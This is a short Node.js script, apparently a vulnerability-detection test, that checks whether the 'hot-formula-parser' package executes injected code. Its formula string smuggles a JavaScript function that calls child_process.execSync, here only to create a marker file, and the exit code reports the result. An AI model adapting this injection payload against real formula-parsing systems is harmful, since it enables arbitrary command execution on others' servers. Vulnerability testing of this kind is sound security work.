if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
const FormulaParser = require("hot-formula-parser").Parser;
const path = "./hot-formula-parser";
data = {};
file_exist = fs.existsSync(path);
console.log("a", file_exist);
try {
	let parser = new FormulaParser();
	parser.parse(
		"SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])",
	);
} catch (error) {}
file_exist = fs.existsSync(path);
fs.unlink(path, function (err) {});
console.log("b", file_exist);

if (file_exist) {
	process.exit(0);
} else {
	process.exit(82);
}
